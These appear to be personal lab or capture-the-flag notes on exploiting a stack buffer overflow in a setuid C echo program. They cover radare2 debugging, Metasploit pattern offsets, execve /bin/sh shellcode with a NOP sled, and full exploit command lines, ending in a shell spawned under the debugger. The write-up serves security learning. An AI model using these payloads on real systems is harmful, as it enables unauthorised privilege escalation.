
The files:
```sh
[user1@ip-10-10-128-37 overflow-3]$ ls -la
total 20
drwxrwxr-x 2 user1 user1   72 Sep  2  2019 .
drwx------ 7 user1 user1  169 Nov 27  2019 ..
-rwsrwxr-x 1 user2 user2 8264 Sep  2  2019 buffer-overflow
-rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c
-rw------- 1 user2 user2   22 Sep  2  2019 secret.txt
```

The code:
```c
#include <stdio.h>
#include <stdlib.h>

void copy_arg(char *string)
{
    char buffer[140];
    strcpy(buffer, string);
    printf("%s\n", buffer);
    return 0;
}

int main(int argc, char **argv)
{
    printf("Here's a program that echo's out your input\n");
    copy_arg(argv[1]);
}

```

Looking at the program with r2:
```sh
[user1@ip-10-10-54-231 overflow-3]$ r2 -d ./buffer-overflow
Process with PID 13282 started...
= attach 13282 13282
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
 -- Select your architecture with: 'e asm.arch=<arch>' or r2 -a from the shell
 
[0x7ffff7dd9ef0]> aaa
...

[0x7ffff7dd9ef0]> afl
0x00400450    1 42           entry0
0x00400480    4 42   -> 37   sym.deregister_tm_clones
0x004004b0    4 58   -> 55   sym.register_tm_clones
0x004004f0    3 34   -> 29   entry.fini0
0x00400520    1 7            entry.init0
0x00400610    1 2            sym.__libc_csu_fini
0x00400527    1 61           sym.copy_arg
0x00400430    1 6            sym.imp.strcpy
0x00400440    1 6            sym.imp.puts
0x00400614    1 9            sym._fini
0x004005a0    3 101  -> 92   sym.__libc_csu_init
0x00400400    3 23           sym._init
0x00400564    1 51           main
0x7ffff7dd9ef0    1 71           fcn.7ffff7dd9ef0
0x7ffff7ddaab0  111 -136357633 -> 1549 fcn.7ffff7ddaab0
0x7ffff7de7f70   18 305  -> 288  fcn.7ffff7de7f70
```

![[Images/Pasted image 20240808152921.png]]

![[Images/Pasted image 20240808153023.png]]

Got for buffer overflow:
```sh
[user1@ip-10-10-128-37 overflow-3]$ ./buffer-overflow `python -c "print('\x90'*110+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'abcdefghijklmnopqrstuvwxyz')"`
Here's a program that echo's out your input
��������������������������������������������������������������������������������������������������������������H�/bin/shH�H�QH�<$H1Ұ;abcdefghijklmnopqrstuvwxyz
Segmentation fault
```

```sh
[user1@ip-10-10-128-37 overflow-3]$ r2 -d -A ./buffer-overflow $(python -c "print('A' * 300)")
...
[0x7ffff7dd9ef0]> dc
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
```
SIGNAL 11 means Segmentation fault and likely buffer overflow

Make non-repetable string
```sh
┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500       
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```

Running in r2 with ^:
```sh
[user1@ip-10-10-60-107 overflow-3]$ r2 -d -A buffer-overflow Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
...

[0x7ffff7dd9ef0]> pdf @main
┌ 51: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_10h @ rbp-0x10
│           ; var int64_t var_4h @ rbp-0x4
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           ; DATA XREF from entry0 @ 0x40046d
│           0x00400564      55             push rbp
│           0x00400565      4889e5         mov rbp, rsp
│           0x00400568      4883ec10       sub rsp, 0x10
│           0x0040056c      897dfc         mov dword [var_4h], edi     ; argc
│           0x0040056f      488975f0       mov qword [var_10h], rsi    ; argv
│           0x00400573      bf30064000     mov edi, str.Here_s_a_program_that_echo_s_out_your_input ; 0x400630 ; "Here's a program that echo's out your input"                                                                                              
│           0x00400578      e8c3feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040057d      488b45f0       mov rax, qword [var_10h]
│           0x00400581      4883c008       add rax, 8
│           0x00400585      488b00         mov rax, qword [rax]
│           0x00400588      4889c7         mov rdi, rax
│           0x0040058b      e897ffffff     call sym.copy_arg
│           0x00400590      b800000000     mov eax, 0
│           0x00400595      c9             leave
└           0x00400596      c3             ret

[0x7ffff7dd9ef0]> pdf @sym.copy_arg
┌ 61: sym.copy_arg (int64_t arg1);
│           ; var int64_t var_98h @ rbp-0x98
│           ; var int64_t var_90h @ rbp-0x90
│           ; arg int64_t arg1 @ rdi
│           ; CALL XREF from main @ 0x40058b
│           0x00400527      55             push rbp
│           0x00400528      4889e5         mov rbp, rsp
│           0x0040052b      4881eca00000.  sub rsp, 0xa0
│           0x00400532      4889bd68ffff.  mov qword [var_98h], rdi    ; arg1
│           0x00400539      488b9568ffff.  mov rdx, qword [var_98h]
│           0x00400540      488d8570ffff.  lea rax, [var_90h]
│           0x00400547      4889d6         mov rsi, rdx
│           0x0040054a      4889c7         mov rdi, rax
│           0x0040054d      e8defeffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
│           0x00400552      488d8570ffff.  lea rax, [var_90h]
│           0x00400559      4889c7         mov rdi, rax
│           0x0040055c      e8dffeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400561      90             nop
│           0x00400562      c9             leave
└           0x00400563      c3             ret

[0x7ffff7dd9ef0]> db 0x400563

[0x7ffff7dd9ef0]> dc
Here´s a program that echo´s out your input
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
hit breakpoint at: 400563

[0x00400563]> dr
rax = 0x000001f5
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7ffff7dd58c0
r8 = 0xffffffffffffffe0
r9 = 0x00000077
r10 = 0x00602454
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe280
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x00000000
rsp = 0x7fffffffe188
rbp = 0x6641396541386541
rip = 0x00400563
rflags = 0x00000206
orax = 0xffffffffffffffff

[0x00400563]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe188  3041 6631 4166 3241 6633 4166 3441 6635  0Af1Af2Af3Af4Af5
0x7fffffffe198  4166 3641 6637 4166 3841 6639 4167 3041  Af6Af7Af8Af9Ag0A
0x7fffffffe1a8  6731 4167 3241 6733 4167 3441 6735 4167  g1Ag2Ag3Ag4Ag5Ag
0x7fffffffe1b8  3641 6737 4167 3841 6739 4168 3041 6831  6Ag7Ag8Ag9Ah0Ah1
0x7fffffffe1c8  4168 3241 6833 4168 3441 6835 4168 3641  Ah2Ah3Ah4Ah5Ah6A
0x7fffffffe1d8  6837 4168 3841 6839 4169 3041 6931 4169  h7Ah8Ah9Ai0Ai1Ai
0x7fffffffe1e8  3241 6933 4169 3441 6935 4169 3641 6937  2Ai3Ai4Ai5Ai6Ai7
0x7fffffffe1f8  4169 3841 6939 416a 3041 6a31 416a 3241  Ai8Ai9Aj0Aj1Aj2A
0x7fffffffe208  6a33 416a 3441 6a35 416a 3641 6a37 416a  j3Aj4Aj5Aj6Aj7Aj
0x7fffffffe218  3841 6a39 416b 3041 6b31 416b 3241 6b33  8Aj9Ak0Ak1Ak2Ak3
0x7fffffffe228  416b 3441 6b35 416b 3641 6b37 416b 3841  Ak4Ak5Ak6Ak7Ak8A
0x7fffffffe238  6b39 416c 3041 6c31 416c 3241 6c33 416c  k9Al0Al1Al2Al3Al
0x7fffffffe248  3441 6c35 416c 3641 6c37 416c 3841 6c39  4Al5Al6Al7Al8Al9
0x7fffffffe258  416d 3041 6d31 416d 3241 6d33 416d 3441  Am0Am1Am2Am3Am4A
0x7fffffffe268  6d35 416d 3641 6d37 416d 3841 6d39 416e  m5Am6Am7Am8Am9An
                                     /r13                               
0x7fffffffe278  3041 6e31 416e 3241 6e33 416e 3441 6e35  0An1An2An3An4An5

[0x00400563]> ds
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
hit breakpoint at: 400563

[0x00400563]> dr
rax = 0x000001f5
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7ffff7dd58c0
r8 = 0xffffffffffffffe0
r9 = 0x00000077
r10 = 0x00602454
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe280
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x00000000
rsp = 0x7fffffffe188
rbp = 0x6641396541386541
rip = 0x00400563
rflags = 0x00000206
orax = 0xffffffffffffffff

[0x00400563]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe188  3041 6631 4166 3241 6633 4166 3441 6635  0Af1Af2Af3Af4Af5
0x7fffffffe198  4166 3641 6637 4166 3841 6639 4167 3041  Af6Af7Af8Af9Ag0A
0x7fffffffe1a8  6731 4167 3241 6733 4167 3441 6735 4167  g1Ag2Ag3Ag4Ag5Ag
0x7fffffffe1b8  3641 6737 4167 3841 6739 4168 3041 6831  6Ag7Ag8Ag9Ah0Ah1
0x7fffffffe1c8  4168 3241 6833 4168 3441 6835 4168 3641  Ah2Ah3Ah4Ah5Ah6A
0x7fffffffe1d8  6837 4168 3841 6839 4169 3041 6931 4169  h7Ah8Ah9Ai0Ai1Ai
0x7fffffffe1e8  3241 6933 4169 3441 6935 4169 3641 6937  2Ai3Ai4Ai5Ai6Ai7
0x7fffffffe1f8  4169 3841 6939 416a 3041 6a31 416a 3241  Ai8Ai9Aj0Aj1Aj2A
0x7fffffffe208  6a33 416a 3441 6a35 416a 3641 6a37 416a  j3Aj4Aj5Aj6Aj7Aj
0x7fffffffe218  3841 6a39 416b 3041 6b31 416b 3241 6b33  8Aj9Ak0Ak1Ak2Ak3
0x7fffffffe228  416b 3441 6b35 416b 3641 6b37 416b 3841  Ak4Ak5Ak6Ak7Ak8A
0x7fffffffe238  6b39 416c 3041 6c31 416c 3241 6c33 416c  k9Al0Al1Al2Al3Al
0x7fffffffe248  3441 6c35 416c 3641 6c37 416c 3841 6c39  4Al5Al6Al7Al8Al9
0x7fffffffe258  416d 3041 6d31 416d 3241 6d33 416d 3441  Am0Am1Am2Am3Am4A
0x7fffffffe268  6d35 416d 3641 6d37 416d 3841 6d39 416e  m5Am6Am7Am8Am9An
                                     /r13                               
0x7fffffffe278  3041 6e31 416e 3241 6e33 416e 3441 6e35  0An1An2An3An4An5
[0x00400563]> 
```
It stopped and did never really pop the old rip off the stack! We can run ds and dc infinitely... 

Find the position in the sting:
```sh
┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x4132664131664130
[*] Exact match at offset 152
```
 Using the number at rsp position since rip is not poped but still causes a segmentation fault. For some reason this program will never actually run the ret instruction. We get 0x00000000 as the address when run and rip/eip stays pointing to the ret instruction. Why? Odd!

The task gives us shell code to use - Code to open a basic shell:
```
\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3
```

the shell code disassembled (r2, aaa, pdf)
![[Images/Pasted image 20240809204245.png]]
A string containing the path to /bin/sh + 0x11 (random extra byte) is put in the RCX registry.
To get rid of the extra 0x11 rcx is first shifted one byte to the left and then to the right.
RCX is then pushed onto the stack.
Other requirements for the syscall to exectue the path are prepared and then the syscall is made.


We have:
```python
position = 152
shellcode = "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3"
address = ????

r2 command = "r2 -d -A buffer-overflow <argument>"

suggested command = "`python -c “print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)”`"
```

```python
python -c "print('\x90'*(152-30-10)+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'\x41'*10+'\x42\x42\x42\x42')"
```
`\x42` are placeholders for the address

Full command to put this in memory - So that we can find the address to jump to:
```sh
r2 -d -A buffer-overflow $(python -c "print('\x90'*(152-30-10)+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'\x41'*10+'\x42\x42\x42\x42')")
```

Running the command:
```sh
[user1@ip-10-10-60-107 overflow-3]$ r2 -d -A buffer-overflow $(python -c "print('\x90'*(152-30-10)+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'\x41'*10+'\x42\x42\x42\x42')")
Process with PID 13474 started...
...

[0x7ffff7dd9ef0]> db 0x400563

[0x7ffff7dd9ef0]> dc
Here´s a program that echo´s out your input
����������������������������������������������������������������������������������������������������������������H�/bin/shH�HQH�<$H1Ұ;AAAAAAAAAABBBB
hit breakpoint at: 400563

[0x00400563]> dr
rax = 0x0000009d
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7ffff7dd58c0
r8 = 0x7ffff7fef4c0
r9 = 0x00000077
r10 = 0x0000005e
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x00000000
rsp = 0x7fffffffe2d8
rbp = 0x4141414141414141
rip = 0x00400563
rflags = 0x00000202
orax = 0xffffffffffffffff

[0x00400563]> pxa @rsp-160
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x7fffffffe238  2de6 ffff ff7f 0000 9090 9090 9090 9090  -...............
0x7fffffffe248  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe258  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe268  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe278  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe288  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe298  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe2a8  9090 9090 9090 9090 48b9 2f62 696e 2f73  ........H./bin/s
0x7fffffffe2b8  6811 48c1 e108 48c1 e908 5148 8d3c 2448  h.H...H...QH.<$H
0x7fffffffe2c8  31d2 b03b 0f05 4141 4141 4141 4141 4141  1..;..AAAAAAAAAA
                 /rsp                                                   
0x7fffffffe2d8  4242 4242 0000 0000 d8e3 ffff ff7f 0000  BBBB............
0x7fffffffe2e8  0000 0000 0200 0000 a005 4000 0000 0000  ..........@.....
0x7fffffffe2f8  3ad1 a4f7 ff7f 0000 0000 0000 0000 0000  :...............
0x7fffffffe308  d8e3 ffff ff7f 0000 0000 0400 0200 0000  ................
0x7fffffffe318  6405 4000 0000 0000 0000 0000 0000 0000  d.@.............
0x7fffffffe328  6dd3 b772 b3b7 2202 5004 4000 0000 0000  m..r..".P.@.....       "

[0x00400563]> ds

[0x42424242]> dr
rax = 0x0000009d
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7ffff7dd58c0
r8 = 0x7ffff7fef4c0
r9 = 0x00000077
r10 = 0x0000005e
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x00000000
rsp = 0x7fffffffe2e0
rbp = 0x4141414141414141
rip = 0x42424242
rflags = 0x00000202
orax = 0xffffffffffffffff
```

This time the Bs are poped from the stack into rip.

```
[0x42424242]> pxa @rsp-160
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x7fffffffe240  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe250  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe260  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe270  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe280  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe290  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe2a0  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe2b0  48b9 2f62 696e 2f73 6811 48c1 e108 48c1  H./bin/sh.H...H.
0x7fffffffe2c0  e908 5148 8d3c 2448 31d2 b03b 0f05 4141  ..QH.<$H1..;..AA
0x7fffffffe2d0  4141 4141 4141 4141 4242 4242 0000 0000  AAAAAAAABBBB....
                 /rsp                                                   
0x7fffffffe2e0  d8e3 ffff ff7f 0000 0000 0000 0200 0000  ................
0x7fffffffe2f0  a005 4000 0000 0000 3ad1 a4f7 ff7f 0000  ..@.....:.......
0x7fffffffe300  0000 0000 0000 0000 d8e3 ffff ff7f 0000  ................
0x7fffffffe310  0000 0400 0200 0000 6405 4000 0000 0000  ........d.@.....
0x7fffffffe320  0000 0000 0000 0000 6dd3 b772 b3b7 2202  ........m..r..".  "
0x7fffffffe330  5004 4000 0000 0000 d0e3 ffff ff7f 0000  P.@.............
[0x42424242]>
```

We select an address in the middle of the nops: 0x7fffffffe270

Convert endianness:
7f  ff  ff  ff  e2  70
`\x70\xe2\xff\xff\xff\x7f`

Command to run:
```sh
r2 -d -A buffer-overflow $(python -c "print('\x90'*(152-30-10)+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'\x41'*10+'\x70\xe2\xff\xff\xff\x7f\x00\x00')")
```

```sh
[user1@ip-10-10-60-107 overflow-3]$ r2 -d -A buffer-overflow $(python -c "print('\x90'*(152-30-10)+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'\x41'*10+'\x70\xe2\xff\xff\xff\x7f\x00\x00')")
Process with PID 13504 started...
...
[0x7ffff7dd9ef0]> dc
Here's a program that echo's out your input
����������������������������������������������������������������������������������������������������������������H�/bin/shH�HQH�<$H1Ұ;AAAAAAAAAAp����
child stopped with signal 4
[+] SIGNAL 4 errno=0 addr=0x7fffffffe2ce code=2 ret=0
[+] signal 4 aka SIGILL received 0
```

When we run this we don't get the expected shell but just a signal 4 illegal instruction
Maybe the cade ran but we didn't see the shell?? Maybe the instructions were just illegal?? The shellcode from the task does not seem to work.


Let's get some other shellcode
https://www.arsouyes.org/articles/2019/54_Shellcode/?ref=hailstormsec.com
```sh
\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
```

Command to run:
```sh
r2 -d -A buffer-overflow $(python -c "print('\x90'*(152-40-10)+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x41'*10+'\x70\xe2\xff\xff\xff\x7f\x00\x00')")
```

divide by zero error, should check bad chars?

### Bad char check

For debugging we used easy to find input to find the address where the bugger variable is stored
`db 0x400563`
`ood AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD`
`pxa @rsp-200`

```
0x7fffffffe260  20e3 ffff ff7f 0000 5004 4000 0000 0000   .......P.@.....
0x7fffffffe270  20e4 ffff ff7f 0000 6105 4000 0000 0000   .......a.@.....
0x7fffffffe280  c0f8 dcf7 ff7f 0000 92e6 ffff ff7f 0000  ................
0x7fffffffe290  4141 4141 4141 4141 4242 4242 4242 4242  AAAAAAAABBBBBBBB
0x7fffffffe2a0  4343 4343 4343 4343 4444 4444 4444 4444  CCCCCCCCDDDDDDDD
0x7fffffffe2b0  0004 ddf7 ff7f 0000 0000 0000 0000 0000  ................
0x7fffffffe2c0  0000 0000 0000 0000 e12b aaf7 ff7f 0000  .........+......
0x7fffffffe2d0  6047 ddf7 ff7f 0000 982f aaf7 ff7f 0000  `G......./......
0x7fffffffe2e0  2b00 0000 0000 0000 6047 ddf7 ff7f 0000  +.......`G......
0x7fffffffe2f0  3006 4000 0000 0000 0c82 a9f7 ff7f 0000  0.@.............
0x7fffffffe300  0100 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffffffe310  40e3 ffff ff7f 0000 5004 4000 0000 0000  @.......P.@.....
                                     /rsp                               
0x7fffffffe320  40e3 ffff ff7f 0000 9005 4000 0000 0000  @.........@.....
0x7fffffffe330  28e4 ffff ff7f 0000 0000 0000 0200 0000  (...............
                 /rbp                                                   
0x7fffffffe340  a005 4000 0000 0000 3ad1 a4f7 ff7f 0000  ..@.....:.......
0x7fffffffe350  0000 0000 0000 0000 28e4 ffff ff7f 0000  ........(.......

```

`db 0x00400552`
`dc`
`pxa @rax`

Found all bad chars: `\00\09\0a\20`

None of the bad chars are in the shellcode! Let's step through it:

#### after strcopy: `db 0x00400552`

```sh
[0x7ffff7dd9ef0]> db 0x00400552
[0x7ffff7dd9ef0]> dc
Here's a program that echo's out your input
hit breakpoint at: 400552
[0x00400552]> pxa @rax
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rax                                                   
0x7fffffffe240  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe250  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe260  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe270  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe280  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe290  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe2a0  9090 9090 9090 6a3b 5848 31d2 49b8 2f2f  ......j;XH1.I.//
0x7fffffffe2b0  6269 6e2f 7368 49c1 e808 4150 4889 e752  bin/shI...APH..R
0x7fffffffe2c0  5748 89e6 0f05 6a3c 5848 31ff 0f05 4141  WH....j<XH1...AA
                 /rbp             /rdi                                  
0x7fffffffe2d0  4141 4141 4141 4141 70e2 ffff ff7f 0000  AAAAAAAAp.......
0x7fffffffe2e0  d8e3 ffff ff7f 0000 0000 0000 0200 0000  ................
0x7fffffffe2f0  a005 4000 0000 0000 3ad1 a4f7 ff7f 0000  ..@.....:.......
0x7fffffffe300  0000 0000 0000 0000 d8e3 ffff ff7f 0000  ................
0x7fffffffe310  0000 0400 0200 0000 6405 4000 0000 0000  ........d.@.....
0x7fffffffe320  0000 0000 0000 0000 468a 3b07 8ddf 5f2d  ........F.;..._-
0x7fffffffe330  5004 4000 0000 0000 d0e3 ffff ff7f 0000  P.@.............
[0x00400552]> dr
rax = 0x7fffffffe240
rbx = 0x00000000
rcx = 0x7ffff7ac3940
rdx = 0x7fffffffe27041
r8 = 0x00000003
r9 = 0x00000077
r10 = 0x0000005e
r11 = 0x7ffff7b98320
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x7fffffffe6c0
rdi = 0x7fffffffe2d7
rsp = 0x7fffffffe230
rbp = 0x7fffffffe2d0
rip = 0x00400552
rflags = 0x00000202
orax = 0xffffffffffffffff
```

#### the functions ret instruction `db 0x400563`

```sh
[0x00400552]> db 0x400563
[0x00400552]> dc
������������������������������������������������������������������������������������������������������j;XH1�I�//bin/shI�APH��RWH��j<XH1�AAAAAAAAAAp����
hit breakpoint at: 400563

[0x00400563]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe2d8  70e2 ffff ff7f 0000 d8e3 ffff ff7f 0000  p...............
0x7fffffffe2e8  0000 0000 0200 0000 a005 4000 0000 0000  ..........@.....
```

The address is there to be read by the ret instruction
```
[0x00400563]> ds
[0x7fffffffe270]> ds
[0x7fffffffe270]> ds
[0x7fffffffe270]> dr
...
rip = 0x7fffffffe271

[0x7fffffffe270]> dc

sh-4.2$ whoami
user1
child stopped with signal 17
[+] SIGNAL 17 errno=0 addr=0x3e90000494e code=1 ret=0
[+] signal 17 aka SIGCHLD received 0
```

It did hop to the right address and we can step through the nops and continue execution to get a prompt. At the signal 17 r2 is backgrounded. If we run exit at this prompt we get the r2 quit questions.

So it works in the debugger but not at normally. Execution at the prompt gives:
```sh
[user1@ip-10-10-184-251 overflow-3]$ ./buffer-overflow $(python -c "print('\x90'*(152-40-10)+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'+'\x41'*10+'\x70\xe2\xff\xff\xff\x7f\x00\x00')")
Here's a program that echo's out your input
������������������������������������������������������������������������������������������������������j;XH1�I�//bin/shI�APH��RWH��j<XH1�AAAAAAAAAAp����
Floating point exception
```

